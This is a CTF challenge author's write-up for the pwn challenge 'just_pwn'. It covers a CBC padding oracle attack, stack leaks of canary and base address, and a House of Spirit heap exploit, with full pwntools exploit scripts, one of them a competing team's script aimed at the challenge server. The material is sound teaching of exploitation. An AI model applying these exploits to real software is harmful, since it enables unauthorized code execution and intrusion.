# 前言
向各位做过我的题目的师傅道歉，自己出的题目漏洞太多了。（PS：这个笨蛋第一次出题，而且是最后几天熬夜上线的，没来得及向协会师傅们请教，还请多海涵）

# 思路
这个题目是一位师傅给了思路让我出的，他的意思大体是以下三关：

- 第一关：最开始的认证是CBC模式（没错，是web的），要用padding oracle进行攻击，通过修改上传的密文来使程序解密出另一种明文，攻击成功之后能让他获得程序的基地址信息。
- 第二关：师傅要我借鉴网鼎杯的Impossible的循环递归抬高栈顶，获得canary和ebp（这两个内存是连续的）
- 第三关：House of Spirit控制程序流

而具体我是这么写的：
- 第一关使之修改明文中的guest_account，不然money不够无法使用某些程序。
- 第二关因为money最大值有限，所以抬高栈顶的函数因为价格只允许运行两次，第一次获得canary和ebp，第二次获得程序基址（这两部分会因为ebp开头的\0而分隔开。）
- 第三关剩下的前只够使用一次push message函数，就在这里进行hos

# 具体实现
## 第一关
我看了所有做出来的人，没有一个是完全按照我的思路做的，原因是因为自己有相当明显的漏洞，而且自己也没有明显的指向性的提示）   
做出来的人主要有两种解法：
- patch程序，因为我把明文放进程序里了，所以只要将程序里`guest_account:0004;guestname:user`改成`guest_account:9999;guestname:user`，又因为自己以time为种子初始化随机数。所以在一定时间差运行patch的程序和远程程序，patch的程序就会给出同样种子的随机数加密修改后的明文，向远程程序发送即可。做出来的六个队伍中有三个是这么做的。
- time(0) 做随机数种⼦的硬伤，这种解法也是利用了这种漏洞，但是另外三个队是直接怼算法。    
总结：应该读取/dev/random或/dev/urandom文件，（明明自己看了网鼎杯的Impossible，竟然没有想到这一点。）
- padding oracle    
  
  这种攻击方式请先看[这篇文章](https://www.freebuf.com/articles/database/150606.html)，这个文章讲的相当详细，我再说就是画蛇添足了。    
  我的plaintext分为三组：
  - `plaintext0`:"guest_account:00" 
  - `plaintext1`:"04;guestname:use" 
  - `plaintext2`:"r\x15\x15\x15\x15\x15\x15\x15\x15\x15\x15\x15\x15\x15\x15\x15"
  
  密文的格式：`iv=`+hex后的iv+`;CipherLen=`+hex后的密文长度+`;CipherText=`+密文+`;`    
  Sign up之后可以得到iv（程序中是固定的）和密文(对应明文将之分为三组):
  - `iv` 
  - `Cipherpart0`
  - `Cipherpart1`
  - `Cipherpart2`
  
  约定：
  - 修改后的`iv`为`iv_`
  - 修改后的`Cipherpart0`为`Cipherpart0_`
  - 加密函数为key()，解密函数为invkey()
  
  首先要通过修改`Cipherpart0`为`Cipherpart0_`来异或`invkey(Cipherpart1)`,使解密后的plaintext1中的`04`为`99`。这里不用padding oracle来获得`invkey(Cipherpart1)`的值，直接使`Cipherpart0`和`plaintext1`异或即可。    
  这部分过程如下
  ```python
  from pwn import *
  just_pwn = process('./just_pwn')

  def getCipher():
      Cipher = ''
      just_pwn.sendlineafter("3.Exit\n","1");
      just_pwn.recvuntil("These is your secretcode:\n");
      recv = just_pwn.recvline().replace('\n','')
      Cipher = recv.split('=')[3][:-1]
      just_pwn.sendline("2");
      return Cipher

  def setDecryption(string, orinDecrypiton, BeforeXorList):
      newDecryption = ""
      for i in range(0, 16):
          newDecryption += hex(BeforeXorList[i]^ord(string[i]))[2:].upper().rjust(2,'0')
      return newDecryption

  Cipher = getCipher()
  just_pwn.recvuntil("3.Exit\n");
  iv = '31323334353637386162636465666768'
  Cipherpart0 = Cipher[0:32]
  Cipherpart1 = Cipher[32:64]
  Cipherpart2 = Cipher[64:96]

  list1 = [] #list1里的内容是invkey(Cipherpart1)
  for i in range(0,16):
      list1.append(ord("04;guestname:use"[i]) ^ int(Cipherpart0[2*i:2*(i+1)],16))
  Cipherpart0 =  setDecryption("99;guestname:use", list1);
  ```
  然后因为我们修改了`Cipherpart0`为`Cipherpart0_`，所以`invkey(Cipherpart0)`也相应地变为了`invkey(Cipherpart0_)`，这时候就应用padding oracle攻击，获得`invkey(Cipherpart0_)`值。再将`invkey(Cipherpart0_)`与想要的明文"guest_account:99"异或，就能得到iv的值了。    
  这部分过程如下：
  ```python
  def isLegal():
    just_pwn.recvline()
    recv = just_pwn.recvline().replace('\n','')
    if(recv == 'Your secret code is broken.'):
        return 1
    elif(recv == 'No access.'):
        #print '###'+recv+'###'
        return 2
    else:
        return 0
  def nListToXorstr(numberList, padding):
      if numberList == []:
          return ''
      string = '';
      for i in numberList:
          string = string + hex(i^padding)[2:].upper().rjust(2,'0')
      return string

  def padding_oracle(head, needtest, rear):
    List_beforeXor = []
    testing = ''
    padding = 1
    while needtest != '':
        testing = needtest[-2:]
        needtest = needtest[:-2]
        number = 0
        for number in range(0, 256):
            number_hex = hex(number)[2:].upper().rjust(2,'0')
            if padding == 1 and number_hex == testing:    continue
            payload = head + needtest + number_hex + nListToXorstr(List_beforeXor, padding) + rear
            just_pwn.sendline(payload)
            if isLegal() == 2: break
        List_beforeXor = [number^padding] + List_beforeXor
        padding += 1
    return List_beforeXor

  #list2里的内容是invkey(Cipherpart0_)
  list2 = padding_oracle('iv=', iv, ';CipherLen=0032;CipherText=' + Cipherpart0 + ';', True)
  iv = setDecryption("guest_account:99", list2);
  ```
  然后发送padding
  ```
  padding = 'iv=' + iv + ';CipherLen=0096;CipherText=' + Cipherpart0 + Cipherpart1 + Cipherpart2 + ';'
  just_pwn.sendline(padding)
  ```

## 第二关
思路是通过buybuybuy函数递归抬高栈顶，再通过getProfessional里的栈溢出获得canary, ebp和程序的基地址信息。对于获得canary,ebp大家都用的是我的思路，但是在获得程序基地址信息的时候又有了非预期。   
buybuybuy函数一次消费的money是4444，用两次就不够了，我想着如果你第二次栈溢出是为了获得程序流的话，在没有基地址的情况下是不可能的。但是我忘了自己为了方便选手而设置了一个getflag()函数，因为这里开了随机化，函数最后一个半字节是不变的，而getflag函数与getProfessional离得相当近，所以只用再猜半个字节就够了。（getflag函数在ida的地址为`.text:000000000000122C`, 其中`22c`是不变的，有位选手设置的为`522c`，就有几率调到getflag函数）。    
总结：还是让他们ROP然后自己计算system函数地址吧

以下是我的愚蠢的代码：
```python
def getData():
    just_pwn.sendline("3");
    just_pwn.sendlineafter("y to confirm\n","n");
    just_pwn.sendlineafter("y to confirm\n","n");
    just_pwn.sendlineafter("y to confirm\n","n");
    just_pwn.sendlineafter("y to confirm\n","n");
    just_pwn.sendlineafter("y to confirm\n","y");
    just_pwn.sendlineafter("buy my software:\n","aaaaaaaa");
    just_pwn.recvuntil("So your reason is:\n");
    recv = just_pwn.recvuntil("But");
    canary = u64(recv[9:16].rjust(8,'\x00'))
    ebp = u64(recv[16:22].ljust(8,'\x00'))
    print hex(canary)
    print hex(ebp)
    
    just_pwn.sendline("3");
    just_pwn.sendlineafter("y to confirm\n","n");
    just_pwn.sendlineafter("y to confirm\n","n");
    just_pwn.sendlineafter("y to confirm\n","n");
    just_pwn.sendlineafter("y to confirm\n","n");
    just_pwn.sendlineafter("y to confirm\n","y");
    just_pwn.sendlineafter("buy my software:\n",'a'*23);
    recv = just_pwn.recvuntil("So your reason is:\n");
    recv = just_pwn.recvuntil("But");
    addr = u64(recv[24:30].ljust(8,'\x00')) - 0xa3 + 0x50
    print hex(addr)
    return [canary, ebp, addr]

  datalist = getData();
  canary = datalist[0]
  ebp = datalist[1]
  addr_buybuybuy = datalist[2]

```

## 第三关
基本上除了有两组在第二个栈溢出获得控制流以外，基本上大家都是在push message里用堆漏洞获得程序控制流。我就讲一下如何在这道题里构建House of Spirit攻击。   
在菜单里选择`1.push message`之后会让你先输入64位的`len`（`len`是`welcome`函数中声明的变量），再跳转到`leavemessage`函数，而`leavemessage`中的`buf`是我们要伪造的chunk的开头。我们先看看进入`leavemessage`函数后的栈分布：

|Item|Value|
|:-----:|:-----:|
|buf    |大小0x20|
|.....  |........|
|canary |大小0x8|
|ebp    |大小0x8|
|返回地址|大小0x8|
|choice2|welecome的变量,始终为0，大小0x8，chunk对齐用|
|len|welecome的变量,值为输入值，大小0x8|

在leavemessage中会将你的输入的信息记录到一个结构体中：
```
struct MESSAGE{
    char title[32]; //message的标题
    char *content; //malloc分配的地址
};
```
malloc分配的content的大小即为len的值，`read`至`buf`后，再`memcpy`至`content`，这里的`Enter the content of your message:`不会引发溢出。
但是之后的`Enter the title of your message:`可以导致输入的`title`溢出到`content`指针。
所以情况很明显了，在输入`content`的时候构造一个伪chunk，这个伪chunk理论大小是从栈中的`buf`到`len`之间的大小。len的值是在welcome中输入的0x20，满足下一个chunk大于2 * `SIZE_SZ`同时小于`av->system_mem`的要求（不懂的话可以参照[这篇文章](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack/))。    
所以构造伪chunk流程是这样的：在`welcome`中输入`len`为0x20(合适即可)，然后`buf`中构造fast chunk：`p64(0) + p64(0x51)`，然后在`title`中溢出至`content`指针，使之指向buf(此时的buf已经构造好了)。    
接下来我们可以看到将构造的伪chunk加入fastbin中的机会，程序会问你`Would you like to change? y to confirm.`，选择`y`便会free掉`content`所指向的内存（这里是伪chunk），然后会再让你输入`content`。所以我们选择放弃pushing并且修改，程序会`free(content)`使`buf`到`len`的区域加入到fastbin中，然后malloc相同大小的内存，便会将之前free掉的内存再分配给content。这次根据程序的可输入的大小最大可以到0x80了（`if(length < 0 || length > 0x80)`）。我们便可以从buf覆盖canary，和返回地址（根据之前获得的buybuybuy的地址计算出getflag）的地址。然后就可以getshell了
具体代码如下：
```python
addr_getflag = addr_buybuybuy +0x122C - 0x176F
def setHOSandGetShell(ebp, canary, addr):
    just_pwn.sendline("1");
    just_pwn.sendlineafter("long is your message?\n","32")
    just_pwn.sendlineafter("content of your message:\n",p64(0) + p64(0x51));
    just_pwn.sendlineafter("title of your message:\n",32*'a'+p64(ebp-0x60+0xc0));
    just_pwn.sendlineafter("pushing? y to confirm.\n","n");
    just_pwn.sendlineafter("like to change? y to confirm.\n","y");
    just_pwn.sendlineafter("long is your message?\n","64");
    just_pwn.sendlineafter("content of your message:\n",'a'*3*8+p64(canary)+'a'*3*8+p64(addr));
just_pwn.interactive()
```
我的糟糕的wp在src文件夹下
以下是ROIS队超级短的WP：
(注：他们本地的just_pwn是patch过的，然后控制程序流的方式是第二关所讲的栈溢出)
```python
from pwn import *
context.log_level = 'debug'

p = process('./just_pwn')
q = remote('118.25.148.66','2333')

p.sendlineafter('3.Exit\n','1')
p.recvline()
k = p.recvline()

q.sendlineafter('3.Exit\n','1')
q.recvline()
l = q.recvline()

print k#得到9999的加密结果

p.close()

q.sendlineafter('3.Exit\n','2')
q.sendafter('Enter your secret code please:\n',k)

def leak(off):
	q.sendlineafter('4.hit on the head of the developer\n------------------------\n','3')
	q.sendlineafter('Confirm? y to confirm\n','y')
	q.sendafter('tell me why do want to buy my software:\n','a'*off)

	q.recvuntil('a'*off)
	leak = u64(q.recvuntil('But I think your reason is not good.\n',drop = True).ljust(8,'\x00'))
	return leak
	
q.sendlineafter('4.hit on the head of the developer\n------------------------\n','3')
q.sendlineafter('Confirm? y to confirm\n','n')
q.sendlineafter('Confirm? y to confirm\n','n')
q.sendlineafter('Confirm? y to confirm\n','n')
q.sendlineafter('Confirm? y to confirm\n','n')
q.sendlineafter('Confirm? y to confirm\n','n')
q.sendlineafter('Confirm? y to confirm\n','n')
q.sendlineafter('Confirm? y to confirm\n','y')
q.sendlineafter('tell me why do want to buy my software:\n','a'*0x8)
q.recvuntil('a'*0x8)
leak = u64(q.recv(8))

canary = leak - 0xa
print hex(canary)

q.sendlineafter('4.hit on the head of the developer\n------------------------\n','3')
q.sendlineafter('Confirm? y to confirm\n','y')
q.sendafter('tell me why do want to buy my software:\n','a'*0xc8+p64(canary)+'a'*8+'\x2c\x52')

q.interactive()
```